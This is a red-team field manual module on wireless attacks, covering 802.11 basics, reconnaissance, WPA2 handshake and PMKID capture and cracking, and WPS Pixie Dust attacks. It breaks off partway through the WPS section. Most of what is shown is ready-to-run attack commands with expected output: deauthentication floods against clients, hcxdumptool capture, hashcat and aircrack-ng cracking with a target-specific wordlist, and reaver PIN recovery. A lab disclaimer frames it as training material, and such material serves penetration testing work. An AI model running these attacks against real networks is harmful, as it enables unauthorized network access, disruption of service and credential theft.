# Wireless Security — Red Team Field Manual
### WPA2/WPA3 | PMKID | Evil Twin | 802.1X/RADIUS | Deauth | Rogue AP | Zigbee/BLE

> **Series Position:** Module 13
> Cross-references: `Ports_Protocols_RedTeam_Field_Manual.md` (RADIUS port 1812, network authentication), `Network_Pivoting_Tunneling_RedTeam_Field_Manual.md` (pivoting through wireless pivot points), `Active_Directory_RedTeam_Field_Manual.md` (802.1X ties to AD credentials), `IoT_Embedded_Systems_RedTeam_Field_Manual.md` (Zigbee/BLE — covered at depth there).
>
> **Red Team Lens:** Wireless attacks are frequently the fastest path into an enterprise. A rogue AP or captured WPA2 handshake can bypass all perimeter defenses — no VPN, no firewall, no IDS. Guest networks, employee laptops on coffee-shop Wi-Fi, and forgotten access points are all in scope for physical red team engagements. Wireless is the air gap that isn't.
>
> **Lab Disclaimer:** Wireless attacks **require authorization for every network tested**. Testing unauthorized networks is a criminal offense in most jurisdictions (CFAA in the US, Computer Misuse Act in the UK, IT Act in India). Build your own lab: Raspberry Pi AP, two wireless adapters, TP-Link WN722N. Everything in this module is tested against your own lab equipment only.

---

## Table of Contents

### PART 1 — WIRELESS FUNDAMENTALS
1. [802.11 Protocol Essentials — What the Air Contains](#1-80211-protocol-essentials)
2. [Wireless Attack Surface Map](#2-wireless-attack-surface-map)
3. [Hardware Setup — Adapters, Modes, Drivers](#3-hardware-setup--adapters-modes-drivers)
4. [Monitor Mode & Packet Injection — The Foundation](#4-monitor-mode--packet-injection)

### PART 2 — RECONNAISSANCE
5. [Passive Wireless Discovery — airodump-ng](#5-passive-wireless-discovery--airodump-ng)
6. [Active Scanning & SSID Discovery](#6-active-scanning--ssid-discovery)
7. [Wardriving & Wireless Mapping](#7-wardriving--wireless-mapping)

### PART 3 — WPA2 ATTACKS
8. [WPA2 Authentication — The Full Handshake Flow](#8-wpa2-authentication--the-full-handshake-flow)
9. [WPA2 4-Way Handshake Capture](#9-wpa2-4-way-handshake-capture)
10. [PMKID Attack — No Client Needed](#10-pmkid-attack--no-client-needed)
11. [WPA2 Handshake Cracking — Hashcat & Aircrack](#11-wpa2-handshake-cracking--hashcat--aircrack)
12. [WPS Attacks — Pixie Dust & PIN Brute Force](#12-wps-attacks--pixie-dust--pin-brute-force)

### PART 4 — WPA3 ATTACKS
13. [WPA3 — What Changed & What Didn't](#13-wpa3--what-changed--what-didnt)
14. [Dragonblood — WPA3 SAE Vulnerabilities](#14-dragonblood--wpa3-sae-vulnerabilities)
15. [WPA3 Downgrade Attacks](#15-wpa3-downgrade-attacks)

### PART 5 — EVIL TWIN & ROGUE AP
16. [Evil Twin — Concept & Impact](#16-evil-twin--concept--impact)
17. [Hostapd-wpe — WPA2 Enterprise Evil Twin](#17-hostapd-wpe--wpa2-enterprise-evil-twin)
18. [airbase-ng — Evil Twin for Personal Networks](#18-airbase-ng--evil-twin-for-personal-networks)
19. [Eaphammer — Enterprise Wireless Attacks](#19-eaphammer--enterprise-wireless-attacks)
20. [Captive Portal Attacks](#20-captive-portal-attacks)

### PART 6 — 802.1X / RADIUS ATTACKS
21. [802.1X Architecture — What It Protects](#21-8021x-architecture--what-it-protects)
22. [EAP Protocol Types & Their Weaknesses](#22-eap-protocol-types--their-weaknesses)
23. [Capturing RADIUS Credentials (PEAP/MSCHAPv2)](#23-capturing-radius-credentials-peapmschapv2)
24. [Cracking MSCHAPv2 — asleap & hashcat](#24-cracking-mschapv2--asleap--hashcat)
25. [802.1X Bypass Techniques](#25-8021x-bypass-techniques)

### PART 7 — DEAUTHENTICATION & DENIAL OF SERVICE
26. [Deauthentication Attacks — Forcing Handshake Capture](#26-deauthentication-attacks)
27. [Beacon Flooding & Management Frame Attacks](#27-beacon-flooding--management-frame-attacks)
28. [Wi-Fi Jamming (Legal Considerations)](#28-wi-fi-jamming)

### PART 8 — MAN-IN-THE-MIDDLE VIA WIRELESS
29. [ARP Spoofing on Wireless Networks](#29-arp-spoofing-on-wireless-networks)
30. [SSL Stripping on Wireless](#30-ssl-stripping-on-wireless)
31. [Bettercap — Full Wireless MitM Framework](#31-bettercap--full-wireless-mitm-framework)

### PART 9 — ENTERPRISE WIRELESS ATTACKS
32. [WPA2-Enterprise Attack Workflow](#32-wpa2-enterprise-attack-workflow)
33. [Rogue RADIUS Server Setup](#33-rogue-radius-server-setup)
34. [Certificate-Based EAP Attacks](#34-certificate-based-eap-attacks)

### PART 10 — POST-COMPROMISE
35. [Post-Wireless-Compromise Actions](#35-post-wireless-compromise-actions)
36. [Wireless Persistence](#36-wireless-persistence)

### PART 11 — DETECTION & DEFENSE
37. [WIDS — Wireless Intrusion Detection](#37-wids--wireless-intrusion-detection)
38. [What Wireless Attacks Leave Behind](#38-what-wireless-attacks-leave-behind)
39. [Wireless Hardening Checklist](#39-wireless-hardening-checklist)

---

# PART 1 — WIRELESS FUNDAMENTALS

---

## 1. 802.11 Protocol Essentials

### Layman's Terms
Wi-Fi is just **radio waves carrying data**. Unlike wired networks where you need physical access to plug in, wireless signals travel through walls — attackers 100 meters away can see your network traffic. The entire 802.11 protocol is built on the assumption that you've already authenticated — and that assumption is the root of most wireless vulnerabilities.

### Real-World Event
**Operation Aurora (2010)** — the sophisticated attack on Google and 30+ tech companies began with spear phishing, but subsequent campaigns by the same actors targeted wireless networks at conferences and hotels where executives stayed. **DEF CON's "Wall of Sheep"** historically displayed credentials of attendees who used unencrypted or weakly protected networks at the conference hotel — thousands of real credentials captured every year. **The TJ Maxx breach (2007)** — the largest credit card theft at the time (45 million cards) — started with an unsecured Wi-Fi network at a store, connected to the broader payment processing network.

```
802.11 FRAME TYPES:

MANAGEMENT FRAMES:
  Beacon         ← AP broadcasts: "I exist, my SSID is X, my capabilities are Y"
  Probe Request  ← Client broadcasts: "Is network X nearby?"
  Probe Response ← AP responds: "Yes, I am X, here are my capabilities"
  Authentication ← Client/AP exchange authentication info
  Association    ← Client joins the network
  Disassociation ← Client or AP ending connection
  Deauthentication ← Terminate authentication (NOT ENCRYPTED in WPA2!)
                    → This is what deauth attacks exploit!

CONTROL FRAMES:
  ACK            ← Acknowledge received frame
  RTS/CTS        ← Request To Send / Clear To Send

DATA FRAMES:
  Data           ← Actual network data (encrypted in WPA2)
  Null Function  ← Keep-alive, power management

CRITICAL SECURITY NOTE:
  In WPA2, DATA frames are encrypted
  But MANAGEMENT frames (beacon, probe, deauth) are NOT encrypted!
  This means:
  - Anyone can see SSID broadcasts (even hidden SSIDs leak via probe requests)
  - Anyone can send fake deauthentication frames
  - Client probing reveals networks clients have connected to before
  WPA3 with PMF (Protected Management Frames) fixes some of this

CHANNELS & FREQUENCIES:
  2.4 GHz band: Channels 1-14 (varies by country)
    Channel 1: 2412 MHz
    Channel 6: 2437 MHz  ← Most common default
    Channel 11: 2462 MHz
    Non-overlapping: 1, 6, 11 (use these for AP setup)
    
  5 GHz band: Channels 36-165
    More channels, less interference, shorter range
    DFS channels require special handling
    
  6 GHz band (Wi-Fi 6E/7): Channels 1-233
    New, less congestion, WPA3 only

RELEVANT SECURITY STANDARDS:
  WEP   (1997): Completely broken — RC4 stream cipher with weak IV
                Break in minutes with aircrack-ng
  WPA   (2003): TKIP encryption — better but still breakable
  WPA2  (2004): AES-CCMP — strong encryption, but 4-way handshake crackable
  WPA3  (2018): SAE handshake (Dragonfly) — resistant to offline dictionary attack
                But has implementation vulnerabilities (Dragonblood)
```

---

## 2. Wireless Attack Surface Map

```
WIRELESS ATTACK SURFACE:

┌─────────────────────────────────────────────────────────────────┐
│                    WIRELESS ECOSYSTEM                           │
│                                                                 │
│  ACCESS POINTS:              CLIENTS:                          │
│  ├── Personal (WPA2-PSK)    ├── Laptops (probe for known nets) │
│  ├── Enterprise (WPA2-EAP)  ├── Mobile phones                  │
│  ├── Guest networks         ├── IoT devices                    │
│  ├── Hidden SSIDs           └── Printers, smart TVs            │
│  └── Rogue APs                                                  │
│                                                                 │
│  ATTACK VECTORS:                                                │
│  ├── Passive sniffing (unencrypted traffic)                     │
│  ├── Handshake capture + offline crack (WPA2-PSK)              │
│  ├── PMKID attack (no client needed)                            │
│  ├── WPS PIN attack / Pixie Dust                                │
│  ├── Evil Twin (impersonate legitimate AP)                      │
│  ├── 802.1X rogue RADIUS (capture enterprise credentials)       │
│  ├── Deauthentication (DoS + force reconnect to attacker AP)   │
│  ├── Client isolation bypass                                    │
│  ├── ARP spoofing on wireless network                          │
│  └── Client probing (know what networks a device has used)     │
│                                                                 │
│  INFORMATION GATHERED WITHOUT ANY ATTACK:                      │
│  ├── SSID names (corporate naming reveals infrastructure)       │
│  ├── BSSID (MAC) → identify AP vendor (first 3 bytes)          │
│  ├── Signal strength → physical location of AP                  │
│  ├── Clients connected → how many devices, their MACs          │
│  └── Probe requests → history of networks clients connected to  │
└─────────────────────────────────────────────────────────────────┘

FREQUENCY OF ISSUES IN ENTERPRISE (real engagement data):
  1. WPS enabled on APs          → ~40% of enterprise APs
  2. Weak PSK on guest network   → almost universal
  3. Misconfigured 802.1X        → ~25% of enterprise deployments
  4. PEAP without server cert validation → very common
  5. Mixed WPA2/WPA3 downgrade possible → emerging issue
  6. Clients probing for home networks → every engagement
  7. Rogue APs planted by employees    → discovered regularly
```

---

## 3. Hardware Setup — Adapters, Modes, Drivers

### Choosing the Right Wireless Adapter

```
RECOMMENDED ADAPTERS FOR PENTESTING:

BEST OVERALL: ALFA AWUS036ACH (dual-band, 802.11ac)
  Chipset: Realtek RTL8812AU
  Bands: 2.4 GHz + 5 GHz
  Monitor mode: YES
  Packet injection: YES
  Driver: rtl8812au (install separately)
  
BUDGET OPTION: TP-Link TL-WN722N v1 (2.4 GHz only)
  Chipset: Atheros AR9271
  Monitor mode: YES
  Packet injection: YES
  Driver: ath9k_htc (built into Kali)
  WARNING: v2/v3 use different chipset — won't work!
  Buy v1 specifically or verify chipset before buying.
  
5 GHz OPTION: ALFA AWUS036ACHM
  Chipset: MediaTek MT7612U
  Bands: 2.4 + 5 GHz
  Monitor mode: YES
  Driver: mt76

NOT SUITABLE FOR PENTESTING:
  Most built-in laptop cards (Intel, Broadcom) — no monitor mode!
  Many USB adapters (RTL8188) — no packet injection!
  Always verify: https://github.com/morrownr/USB-WiFi

CHIPSETS THAT WORK WELL:
  Atheros AR9271    ← Best supported, all features
  Ralink RT3070     ← Good, available everywhere
  Realtek RTL8812AU ← Modern, dual-band, needs driver install
  MediaTek MT7612U  ← Modern, good support
```

### Driver Installation

```bash
# ── CHECK WHAT ADAPTER YOU HAVE ────────────────────────────────────
lsusb
# Expected: Bus 001 Device 003: ID 0cf3:9271 Qualcomm Atheros AR9271

iwconfig
# Lists wireless interfaces and their current mode

# ── INSTALL RTL8812AU DRIVER (ALFA AWUS036ACH) ────────────────────
sudo apt install dkms
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au
sudo make dkms_install
# Or using package:
sudo apt install realtek-rtl88xxau-dkms

# Verify driver loaded:
lsmod | grep 8812
# Expected: 88XXau  (module loaded)

# ── INSTALL AIRCRACK-NG SUITE ──────────────────────────────────────
sudo apt install aircrack-ng
# Includes: airmon-ng, airodump-ng, aireplay-ng, airbase-ng, airdecap-ng

# ── VERIFY INJECTION CAPABILITY ────────────────────────────────────
# First put in monitor mode (next section)
sudo aireplay-ng --test wlan0mon
# Expected:
# Trying broadcast probe requests...
# Injection is working!
# Found 3 APs
# 30/30: 100%
```

---

## 4. Monitor Mode & Packet Injection — The Foundation

### Layman's Terms
By default, your wireless adapter **only processes packets addressed to you** — like only listening to your own phone calls. Monitor mode lets it **hear every packet in the air**, regardless of who it's addressed to. Packet injection lets you **transmit custom packets** — including fake deauthentication frames, probe requests, and authentication packets. These two capabilities are the foundation of all wireless attacks.

```bash
# ── ENABLE MONITOR MODE ────────────────────────────────────────────
# Method 1: airmon-ng (easiest)
sudo airmon-ng check kill   # Kill interfering processes (NetworkManager etc.)
# Expected:
# PID  Name
# 1234 wpa_supplicant   ← killed
# 5678 NetworkManager   ← killed

sudo airmon-ng start wlan0
# Expected:
# PHY  Interface  Driver     Chipset
# phy0 wlan0      ath9k_htc  Qualcomm AR9271
# (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
# Created: wlan0mon

iwconfig wlan0mon
# Expected: Mode:Monitor  ← Monitor mode confirmed!

# Method 2: iw commands (manual)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Verify:
iw dev wlan0 info | grep type
# Expected: type monitor

# Method 3: iwconfig (legacy)
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

# ── SET SPECIFIC CHANNEL ────────────────────────────────────────────
sudo airmon-ng start wlan0 6      # Monitor channel 6 only
sudo iwconfig wlan0mon channel 6  # Or manually set channel

# ── VERIFY PACKET INJECTION ────────────────────────────────────────
sudo aireplay-ng -9 wlan0mon
# -9 = injection test
# Expected:
# Trying broadcast probe requests...
# Injection is working!
# 10/10: 100%
# If "Injection is working!" → good to go

# ── DISABLE MONITOR MODE (RESTORE NORMAL OPERATION) ────────────────
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

# PART 2 — RECONNAISSANCE

---

## 5. Passive Wireless Discovery — airodump-ng

### Layman's Terms
Passive discovery means **listening without transmitting** — completely invisible to the target. airodump-ng captures all wireless frames in range and displays a live view of every access point and every client, who's connected to what, and the traffic flowing between them.

```bash
# ── BASIC DISCOVERY ────────────────────────────────────────────────
sudo airodump-ng wlan0mon
# Captures on all channels (hops between them)

# Expected output — TOP SECTION (Access Points):
# BSSID             PWR  Beacons  #Data  CH  MB    ENC  CIPHER  AUTH  ESSID
# AA:BB:CC:DD:EE:FF -70  100      1543   6   300   WPA2 CCMP    PSK   CorpWireless
# 11:22:33:44:55:66 -65  200      234    1   54    WPA2 CCMP    MGT   Corp-8021X
# 77:88:99:AA:BB:CC -80  50       0      11  130   WPA2 CCMP    PSK   GuestWiFi
# DD:EE:FF:00:11:22 -60  300      5600   6   300   WPA3 CCMP    SAE   SecureNet

# COLUMN MEANINGS:
# BSSID:   MAC address of the AP
# PWR:     Signal strength (higher absolute = closer)
# Beacons: Management frames sent
# #Data:   Data packets (higher = more active clients)
# CH:      Current channel
# MB:      Max speed
# ENC:     Encryption type (WPA2/WPA3/WEP/OPN)
# CIPHER:  CCMP(AES) or TKIP
# AUTH:    PSK (personal) or MGT (enterprise/802.1X) or SAE (WPA3)
# ESSID:   Network name (SSID)

# Expected output — BOTTOM SECTION (Clients):
# BSSID             STATION            PWR   Rate  Lost  Frames  Probe
# AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -55   54-54  0    2341    CorpWireless
# (not associated)  AA:BB:CC:11:22:33 -70   0-1    0    5       HomeNet,CoffeeShop,Hotel_WiFi

# KEY INTEL FROM CLIENT LIST:
# BSSID = AP the client is connected to
# STATION = Client's MAC address (reveals device vendor!)
# Probe = Networks this client is looking for!
#   → "HomeNet,CoffeeShop,Hotel_WiFi" = client's history
#   → Create evil twin with any of these names → client auto-connects!

# ── TARGET A SPECIFIC NETWORK ──────────────────────────────────────
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6 = lock to channel 6 (target's channel)
# --bssid = only capture from this AP
# -w capture = write to capture.cap, capture.csv, capture.kismet.csv

# ── USEFUL FILTERS ─────────────────────────────────────────────────
# Only show WPA networks (hide OPN/WEP):
sudo airodump-ng wlan0mon --encrypt WPA

# Only show enterprise networks (802.1X targets):
sudo airodump-ng wlan0mon | grep MGT

# Save to file for offline analysis:
sudo airodump-ng wlan0mon -w all_networks --output-format csv,pcap

# ── ANALYZE CAPTURE FILE ────────────────────────────────────────────
# View in Wireshark:
wireshark capture-01.cap &
# Filter: wlan.fc.type_subtype == 0x08  (beacon frames)
# Filter: wlan.fc.type_subtype == 0x04  (probe requests)

# Extract SSIDs from probe requests (client history):
tshark -r capture-01.cap -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan_mgt.ssid 2>/dev/null | sort -u
# Expected:
# aa:bb:cc:11:22:33  HomeNetwork
# aa:bb:cc:11:22:33  CoffeeShopFreeWiFi
# aa:bb:cc:11:22:33  Airport_WiFi
# → This device is looking for all these networks!
```

---

## 6. Active Scanning & SSID Discovery

```bash
# ── FIND HIDDEN SSIDS ──────────────────────────────────────────────
# Hidden SSIDs: AP doesn't broadcast SSID in beacon frames
# BUT: SSID appears in probe requests/responses!
# Wait for a client to connect → SSID revealed in probe response

# In airodump-ng output, hidden SSID shows as:
# <length: 12>   ← Blank SSID, but length tells you how many chars!
# or <hidden>

# Force reveal: send deauth → client reconnects → probe response shows SSID
# (This requires active attack — covered in Section 26)

# ── PROBE REQUEST CAPTURE (MAP CLIENT HISTORY) ─────────────────────
# Clients broadcast probe requests constantly looking for known networks
sudo airodump-ng wlan0mon --output-format csv -w probes

# Extract probe requests:
tshark -r probes-01.cap \
  -Y "wlan.fc.type_subtype == 0x04 and !wlan_mgt.ssid == 0x00" \
  -T fields -e frame.time -e wlan.sa -e wlan_mgt.ssid 2>/dev/null | \
  sort -u
# Expected output:
# 2024-01-16 03:14:00  aa:bb:cc:11:22:33  Corp_WiFi
# 2024-01-16 03:14:01  aa:bb:cc:11:22:33  Office_Guest
# 2024-01-16 03:14:02  dd:ee:ff:44:55:66  HomeNet_5G

# This reveals:
# - What corporate networks exist (corp clients probing for them)
# - Employees' home network names (for targeted evil twin)
# - External networks employees use (coffee shops, hotels)

# ── WIFI SURVEY TOOLS ──────────────────────────────────────────────
# wash (WPS-enabled network finder):
sudo wash -i wlan0mon
# Expected:
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF  6  -65  2.0  No   AtherosC  CorpWireless
# ← WPS 2.0 enabled, not locked = try Pixie Dust!

# hostapd-wpe scanner:
# Identifies networks running 802.1X (enterprise targets)
sudo airodump-ng wlan0mon | grep -i MGT
```

---

## 7. Wardriving & Wireless Mapping

```bash
# Wardriving: systematic geographic collection of wireless network data

# ── TOOLS ──────────────────────────────────────────────────────────
# Kismet: comprehensive wireless network detector
sudo apt install kismet
sudo kismet -c wlan0mon
# Web UI at http://localhost:2501 (default pass: kismet)
# Logs all discovered networks, clients, GPS coordinates

# With GPS:
sudo kismet -c wlan0mon --gps=serial:gpsd,localhost,2947

# ── AUTOMATED WARDRIVING SETUP ─────────────────────────────────────
# Equipment:
# - Raspberry Pi 4 (portable)
# - Two wireless adapters (one for capture, one for hotspot)
# - GPS USB dongle
# - Power bank

# On Raspberry Pi:
sudo apt install kismet gpsd gpsd-clients

# Configure Kismet:
cat > /etc/kismet/kismet_site.conf << 'EOF'
source=wlan1:name=capture
gps=serial:device=/dev/ttyUSB0,baud=9600
log_prefix=/home/pi/kismet_logs
EOF

sudo kismet

# ── WIGLE — ONLINE WARDRIVING DATABASE ────────────────────────────
# Upload Kismet logs to: https://wigle.net
# Query the database for:
# - Historical network data in a target area
# - Known AP locations
# - Network SSID/BSSID history
# API access for automated queries:
pip3 install wigle
wigle --username USER --token TOKEN query --ssid "CorpWireless"
```

---

# PART 3 — WPA2 ATTACKS

---

## 8. WPA2 Authentication — The Full Handshake Flow

### Layman's Terms
WPA2 uses a **4-step handshake** between client and AP to establish encryption. During this handshake, both sides prove they know the password (PSK) **without actually sending the password**. But the handshake itself travels through the air and can be captured — then cracked offline at your leisure on powerful hardware.

```
WPA2-PSK 4-WAY HANDSHAKE:

Before handshake:
  PSK = the Wi-Fi password
  PMK (Pairwise Master Key) = PBKDF2-SHA1(PSK, SSID, 4096 iterations, 32 bytes)
       ↑ This is what we crack — derived from password + SSID
  Both client and AP independently compute PMK from the shared password

HANDSHAKE FLOW:
  AP                                         CLIENT
  │                                               │
  │ ←── Client Association Request ──────────────│
  │                                               │
  │ ── Msg 1 ────────────────────────────────────►│
  │    ANonce (random number from AP)             │
  │                                               │
  │ ◄── Msg 2 ───────────────────────────────────│
  │     SNonce (random number from client)        │
  │     MIC (Message Integrity Code)              │
  │     ← Client computes PTK from PMK+ANonce+SNonce+MACs
  │     ← MIC signed with PTK proves client knows PMK!
  │                                               │
  │ ── Msg 3 ────────────────────────────────────►│
  │    GTK (Group Temporal Key, encrypted)        │
  │    MIC (AP's proof it knows PMK)              │
  │                                               │
  │ ◄── Msg 4 ───────────────────────────────────│
  │     ACK (client confirms key received)        │
  │                                               │
  Encrypted communication begins!

WHAT WE CAPTURE: Message 2 (contains MIC)
WHAT WE CRACK:   MIC in Message 2
  MIC = HMAC-SHA1(PTK, handshake_data)
  PTK = PRF(PMK, "Pairwise key expansion", AP_MAC + Client_MAC + ANonce + SNonce)
  PMK = PBKDF2(PSK, SSID, 4096)
  
  So: crack PMK → derive PTK → verify against captured MIC
  Entire dictionary tried offline at GPU speed (billions/second on RTX 4090!)

PMKID (alternative, Section 10):
  PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC)
  First 128 bits of HMAC-SHA1 output
  Can be captured without a client connecting!
  Broadcast in RSN information elements of association frames
```

---

## 9. WPA2 4-Way Handshake Capture

```bash
# ══════════════════════════════════════════════════════════════════
# CAPTURING THE WPA2 HANDSHAKE
# ══════════════════════════════════════════════════════════════════

# STEP 1: Identify target network
sudo airodump-ng wlan0mon
# Note: BSSID (AA:BB:CC:DD:EE:FF), Channel (6), SSID (CorpWireless)
# Note: Connected clients (11:22:33:44:55:66)

# STEP 2: Target specific network and save capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# Leave this running in Terminal 1!
# Watch top-right corner for: "WPA handshake: AA:BB:CC:DD:EE:FF"

# STEP 3: Wait for a client to naturally connect (passive)
# OR: Force reconnect with deauthentication (active):

# In Terminal 2 — send deauth packets to force reconnect:
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -0 = deauthentication attack
# 5  = number of deauth frames (5 is usually enough)
# -a = AP's BSSID
# -c = Client to deauth (or broadcast: omit -c)
# Expected output:
# 03:14:00  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
# 03:14:00  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]

# STEP 4: Watch for handshake in Terminal 1:
# Expected top-right: "WPA handshake: AA:BB:CC:DD:EE:FF"
# This confirms the 4-way handshake was captured!

# STEP 5: Verify handshake in capture file:
aircrack-ng handshake-01.cap
# Expected:
# Index  SSID        BSSID              HANDSHAKE
#   1    CorpWireless AA:BB:CC:DD:EE:FF YES ← Handshake captured!

# Alternative verification:
pyrit -r handshake-01.cap analyze
# Expected:
# #1: 'CorpWireless', 1 handshake(s):
# #1-1: HMAC_SHA1_AES, good  ← Complete handshake!

# STEP 6: Also try with hcxdumptool (more reliable capture):
sudo apt install hcxdumptool hcxtools
sudo hcxdumptool -o capture.pcapng -i wlan0mon \
  --filterlist_ap=bssids.txt --filtermode=2
# Convert for hashcat:
hcxpcapngtool -o hashes.hc22000 capture.pcapng
# Expected:
# summary:
#   written WPA2 (v2) handshakes to hashes.hc22000: 3
```

---

## 10. PMKID Attack — No Client Needed

### Layman's Terms
The PMKID attack (discovered 2018 by Jens Steube, creator of Hashcat) is **the biggest advance in WPA2 cracking** in years. Previously you needed to wait for or force a client to connect. The PMKID is part of every association frame the AP sends — you can capture it **directly from the AP without any clients present**. Empty parking lot at 3 AM — still grab the hash and crack it offline.

```bash
# ── TOOL: hcxdumptool ─────────────────────────────────────────────
sudo apt install hcxdumptool hcxtools

# Capture PMKID and handshakes:
sudo hcxdumptool -o capture.pcapng -i wlan0mon --active_beacon
# --active_beacon = send association requests to APs to trigger PMKID

# Target specific AP:
echo "AABBCCDDEEFF" > targets.txt   # No colons!
sudo hcxdumptool -o capture.pcapng -i wlan0mon \
  --filterlist_ap=targets.txt --filtermode=2 \
  --active_beacon
# Run for 60-120 seconds, then Ctrl+C

# ── CONVERT TO HASHCAT FORMAT ─────────────────────────────────────
hcxpcapngtool -o hashes.hc22000 capture.pcapng
# Expected:
# summary:
#   written WPA2 (v2) handshakes to hashes.hc22000: 5
#   written WPA PMKID (v2) to hashes.hc22000: 3

cat hashes.hc22000 | head -3
# Expected format:
# WPA*02*PMKID*BSSID*STATIONMAC*SSID***
# or
# WPA*01*handshake_data...

# ── CRACK THE PMKID ───────────────────────────────────────────────
# Dictionary attack:
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt
# Mode 22000 = WPA-PBKDF2-PMKID+EAPOL (combines PMKID and handshakes)

# With rules:
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Expected on crack:
# PMKID_HASH:CorpWireless:Password1234!  ← Cracked!
# Status: Cracked

# ── BENEFITS OF PMKID ATTACK ────────────────────────────────────────
# 1. No client deauthentication needed (stealthy!)
# 2. No waiting for client to connect
# 3. Works at 3 AM when no clients are present
# 4. Same cracking approach as handshake (hashcat -m 22000)
# 5. Works on any AP that supports PMKID (most modern APs)
```

---

## 11. WPA2 Handshake Cracking — Hashcat & Aircrack

```bash
# ══════════════════════════════════════════════════════════════════
# CRACKING WPA2 HASHES
# ══════════════════════════════════════════════════════════════════

# CAPTURE FILE FORMATS:
# .cap / .pcap: from airodump-ng → needs conversion for hashcat
# .hc22000: native hashcat format (from hcxtools)
# .hccapx: older hashcat format

# ── CONVERT FORMATS ────────────────────────────────────────────────
# airodump-ng .cap → hashcat .hc22000:
hcxpcapngtool -o hash.hc22000 handshake-01.cap
# OR older format:
cap2hccapx handshake-01.cap hash.hccapx

# ── HASHCAT — GPU CRACKING (FASTEST) ──────────────────────────────
# IMPORTANT: hashcat needs your host GPU
# If on VM: enable GPU passthrough or run on host Windows/Linux

# Basic dictionary attack:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000 = WPA-PBKDF2-PMKID+EAPOL (current preferred mode)
# Expected:
# HASH:PASSWORD123!    ← Cracked!

# With rules (transform wordlist):
hashcat -m 22000 hash.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
# Tries: password → Password, password1, PASSWORD, p@ssword etc.
# Dramatically increases coverage

# Multiple rule files:
hashcat -m 22000 hash.hc22000 rockyou.txt \
  -r dive.rule -r best64.rule

# Mask attack (when you know pattern):
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special
hashcat -m 22000 hash.hc22000 -a 3 "Corp?d?d?d?d"
# Tries: Corp0000, Corp0001... Corp9999

# Combined: word + digits 0-9999:
hashcat -m 22000 hash.hc22000 -a 1 words.txt digits.txt
# Tries every combination of word from list1 + word from list2

# Company-specific wordlist (OSINT-based):
cat > company_wordlist.txt << 'EOF'
TargetCorp
targetcorp
TARGETCORP
TargetCorp1
TargetCorp123
TargetCorp!
TargetCorp2024
TargetCorp2024!
CompanyWiFi
CompanyWifi123
Welcome1
Welcome123
Password1
Password123
Summer2024
Winter2024
EOF
hashcat -m 22000 hash.hc22000 company_wordlist.txt

# ── AIRCRACK-NG — CPU CRACKING (SLOWER) ───────────────────────────
# Use for quick tests or when GPU unavailable:
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
# Expected:
# KEY FOUND! [ Password1234! ]

# ── ONLINE RESOURCES ───────────────────────────────────────────────
# CloudCracker: https://www.cloudcracker.com (paid)
# OnlineHashCrack: https://www.onlinehashcrack.com
# Custom cloud GPU: AWS p3 instances, vast.ai (GPUs for hire)

# ── CRACKING SPEED REFERENCE ───────────────────────────────────────
# WPA2 (22000) is slow due to PBKDF2 with 4096 iterations:
# CPU (i7-12700):    ~20,000 H/s   (good for testing)
# GPU (RTX 3080):    ~600,000 H/s  (much better)
# GPU (RTX 4090):    ~1,200,000 H/s (fastest consumer GPU)
# rockyou.txt has 14 million passwords → cracked in ~12 seconds on RTX 4090

# Weak/short passwords crack in seconds
# Complex 12+ char passwords: may take years (or never)
# This is why password complexity matters for WPA2!
```

---

## 12. WPS Attacks — Pixie Dust & PIN Brute Force

### Layman's Terms
WPS (Wi-Fi Protected Setup) was designed to make connecting devices easy — push a button or enter an 8-digit PIN. The PIN has a **devastating design flaw**: it's verified in two halves of 4 digits each. Instead of cracking all 100,000,000 possibilities, you crack 10,000 + 10,000 = 20,000. And Pixie Dust attack recovers the PIN in seconds using a crypto weakness in how some routers generate their random numbers.

```bash
# ── CHECK FOR WPS ENABLED ─────────────────────────────────────────
sudo wash -i wlan0mon
# Expected:
# BSSID              Ch  dBm  WPS  Lck  Vendor     ESSID
# AA:BB:CC:DD:EE:FF  6  -65  2.0  No   Ralink     CorpWireless
#                                   ^^
#                        WPS 2.0, not locked = VULNERABLE!
# Lck = Yes means WPS locked (too many failed attempts)

# ── PIXIE DUST ATTACK (OFFLINE, SECONDS) ──────────────────────────
# Works against: Ralink, Realtek, Broadcom (some) chipsets
# Exploits weak PRNG used to generate nonces in WPS exchange

sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv -K 1 -f -N
# -i = interface in monitor mode
# -b = target BSSID
# -vvv = very verbose
# -K 1 = Pixie Dust attack
# -f = fixed channel (don't hop)
# -N = no associated status

# Expected if vulnerable:
# [Pixie-Dust] Starting Pixie Dust Attack
# [Pixie-Dust] ES1: 11:22:33:44:55:66:77:88...
# [Pixie-Dust] ES2: AA:BB:CC:DD:EE:FF:00:11...
# [Pixie-Dust] WPS pin: 12345678       ← WPS PIN found!
# [+] WPS PIN: '12345678'
# [+] WPA PSK: 'CorpWifiPassword123!'  ← WIFI PASSWORD!
# [+] AP SSID: 'CorpWireless'

# ── WPS PIN BRUTE FORCE (SLOWER) ──────────────────────────────────
# ~11,000 combinations due to checksum + split verification
